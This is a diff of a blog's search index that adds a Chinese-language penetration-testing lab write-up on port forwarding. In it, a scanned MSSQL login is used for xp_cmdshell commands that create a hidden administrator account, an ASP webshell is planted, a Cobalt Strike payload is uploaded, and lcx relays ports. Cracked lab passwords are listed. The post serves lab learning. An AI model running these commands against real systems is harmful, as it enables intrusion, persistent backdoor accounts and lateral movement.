@@ -1,11 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>msf</title>
-    <url>/2021/09/04/msf/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>vim终端编辑器</title>
     <url>/2021/09/02/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/</url>
     <content><![CDATA[<h2 id="&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;"><a href="#&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;" class="headerlink" title="&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;"></a>&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;</h2><h3 id="&#x5B89;&#x88C5;&#xFF1A;"><a href="#&#x5B89;&#x88C5;&#xFF1A;" class="headerlink" title="&#x5B89;&#x88C5;&#xFF1A;"></a>&#x5B89;&#x88C5;&#xFF1A;</h3><p><code>yum install -y vim</code></p>
@@ -15,6 +10,66 @@
 <p>&#x53CB;&#x60C5;&#x63D0;&#x793A;&#xFF1A;&#x82E5;&#x975E;&#x6B63;&#x5E38;&#x5173;&#x95ED;vim&#xFF0C;&#x5219;&#x4F1A;&#x751F;&#x6210;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF08;&#x9690;&#x85CF;&#x7684;&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
+]]></content>
+  </entry>
+  <entry>
+    <title>msf</title>
+    <url>/2021/09/03/lcx/</url>
+    <content><![CDATA[<h2 id="210903&#x5185;&#x7F51;&#x6E17;&#x900F;-&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#210903&#x5185;&#x7F51;&#x6E17;&#x900F;-&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="210903&#x5185;&#x7F51;&#x6E17;&#x900F;:&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>210903&#x5185;&#x7F51;&#x6E17;&#x900F;:&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h2><p>&#x9776;&#x573A;&#x5730;&#x5740;</p>
+<p><a href="http://192.168.179.75/1.asp">http://192.168.179.75/1.asp</a></p>
+<p>&#x901A;&#x8FC7;fscan&#x626B;&#x63CF;&#x5F97;&#x5230;mssql&#x8D26;&#x53F7;&#x79D8;&#x5BC6;&#xFF0C;Navicat&#x94FE;&#x63A5;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#xFF0C;whoami&#x67E5;&#x770B;&#xFF0C;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;system&#xFF0C;&#x521B;&#x5EFA;&#x8D26;&#x53F7;gd13$&#xFF0C;&#x5BC6;&#x7801;admin@123&#xFF0C;&#x6DFB;&#x52A0;&#x5230;administrator&#x7EC4;&#xFF0C;&#x901A;&#x8FC7;&#x8BE5;&#x8D26;&#x53F7;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF0C;&#x5728;www&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;asp&#xFF0C;&#x6253;&#x5F00;kali&#x8681;&#x5251;&#x94FE;&#x63A5;</p>
+<img src="/2021/09/03/lcx/2021/09/03/lcx/image-20210831191818764.png" class title="This is an image">
+
+<p><img src="/2021/09/03/lcx/image-20210831191818764.png" alt="image-20210831191818764"></p>
+<p>fscan &#x626B;&#x63CF;&#x76EE;&#x6807;ip  </p>
+<p><code>/home/kali/cs4.2/tools/fscan_amd64 -h 192.168.179.75</code></p>
+<p><img src="/2021/09/03/lcx/image-20210831192054560.png" alt="image-20210831192054560"></p>
+<p><img src="/2021/09/03/lcx/image-20210831194028029.png" alt="image-20210831194028029"></p>
+<p><code>exec(&apos;xp_cmdshell &quot;whoami&quot;&apos;)</code></p>
+<p>&#x6DFB;&#x52A0;&#x7528;&#x6237; gd13$  admin@123 </p>
+<p><code>exec(&apos;xp_cmdshell &quot;net user gd13$ admin@123 /add&quot;&apos;)</code></p>
+<p><img src="/2021/09/03/lcx/image-20210831202425448.png" alt="image-20210831202425448"></p>
+<p><img src="/2021/09/03/lcx/image-20210831202530309.png" alt="image-20210831202530309"></p>
+<p><code>exec(&apos;xp_cmdshell &quot;net localgroup administrators gd13$ /add&quot;&apos;)</code></p>
+<p><code>exec(&apos;xp_cmdshell &quot;net localgroup administrators&quot;&apos;)</code></p>
+<p><img src="/2021/09/03/lcx/image-20210831202648860.png" alt="image-20210831202648860"></p>
+<p><img src="/2021/09/03/lcx/image-20210831203004613.png" alt="image-20210831203004613"></p>
+<p>&#x67E5;&#x770B;user&#x8868; &#x91CC;&#x9762;&#x6709;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF0C;&#x867D;&#x7136;&#x89E3;&#x5BC6;&#x6210;&#x529F;&#x4F46;&#x662F;&#xFF0C;&#x7981;&#x6B62;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;</p>
+<p><img src="/2021/09/03/lcx/image-20210831203016345.png" alt="image-20210831203016345"></p>
+<p>admin     qwer1234!@#$</p>
+<p><img src="/2021/09/03/lcx/image-20210831204542590.png" alt="image-20210831204542590"></p>
+<p>bao  bao123</p>
+<p><img src="/2021/09/03/lcx/image-20210831203215306.png" alt="image-20210831203215306"></p>
+<p><img src="/2021/09/03/lcx/image-20210831205122155.png" alt="image-20210831205122155"></p>
+<p>kali&#x4E2D;&#x6253;&#x5F00;cs &#x94FE;&#x63A5;vps&#x670D;&#x52A1;&#x5668;</p>
+<p><img src="/2021/09/03/lcx/image-20210903204618071.png" alt="image-20210903204618071"></p>
+<p><img src="/2021/09/03/lcx/image-20210903204838431.png" alt="image-20210903204838431"></p>
+<p>&#x751F;&#x6210;Windows&#x7248;&#x7684;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;</p>
+<p><img src="/2021/09/03/lcx/image-20210903205111769.png" alt="image-20210903205111769"></p>
+<p><img src="/2021/09/03/lcx/image-20210903205153499.png" alt="image-20210903205153499"></p>
+<p>&#x4F7F;&#x7528;&#x8681;&#x5251;&#x4E0A;&#x4F20;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;</p>
+<p><img src="/2021/09/03/lcx/image-20210903205420939.png" alt="image-20210903205420939"></p>
+<p>&#x53CC;&#x51FB;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;&#xFF0C;&#x5728;cs&#x4E2D;&#x67E5;&#x770B;</p>
+<p><img src="/2021/09/03/lcx/image-20210903210054589.png" alt="image-20210903210054589"></p>
+<p><img src="/2021/09/03/lcx/image-20210903210314507.png" alt="image-20210903210314507"></p>
+<p><img src="/2021/09/03/lcx/image-20210903210456317.png" alt="image-20210903210456317"></p>
+<p><code>shell C:\www\lcx.exe -tran 3333 192.168.1.107 8080</code></p>
+<p><img src="/2021/09/03/lcx/image-20210903211135544.png" alt="image-20210903211135544"></p>
+<p><img src="/2021/09/03/lcx/image-20210903211948437.png" alt="image-20210903211948437"></p>
+<p><img src="/2021/09/03/lcx/image-20210903212024618.png" alt="image-20210903212024618"></p>
+<p>&#x8F6C;&#x53D1;&#x6210;&#x529F;&#xFF0C;&#x8BBF;&#x95EE;75&#x7684;3333&#x7AEF;&#x53E3;&#xFF0C;107&#x7684;8080&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x6210;&#x529F;</p>
+<p><img src="/2021/09/03/lcx/image-20210903212112116.png" alt="image-20210903212112116"></p>
+<p><img src="/2021/09/03/lcx/image-20210903212704462.png" alt="image-20210903212704462"></p>
+<p><img src="/2021/09/03/lcx/image-20210903212729352.png" alt="image-20210903212729352"></p>
+<p>use18</p>
+<p><code>shell C:\www\lcx.exe -tran 4444 192.168.22.187 4444</code></p>
+<p><img src="/2021/09/03/lcx/image-20210903222630836.png" alt="image-20210903222630836"></p>
+<p><img src="/2021/09/03/lcx/image-20210903223233650.png" alt="image-20210903223233650"></p>
+<p><img src="/2021/09/03/lcx/image-20210903225319610.png" alt="image-20210903225319610"></p>
+<p><img src="/2021/09/03/lcx/image-20210903225342838.png" alt="image-20210903225342838"></p>
+<p>&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;Tomcat</p>
+<p><img src="/2021/09/03/lcx/image-20210903230024732.png" alt="image-20210903230024732"></p>
+<p><img src="/2021/09/03/lcx/image-20210903230155364.png" alt="image-20210903230155364"></p>
 ]]></content>
   </entry>
   <entry>
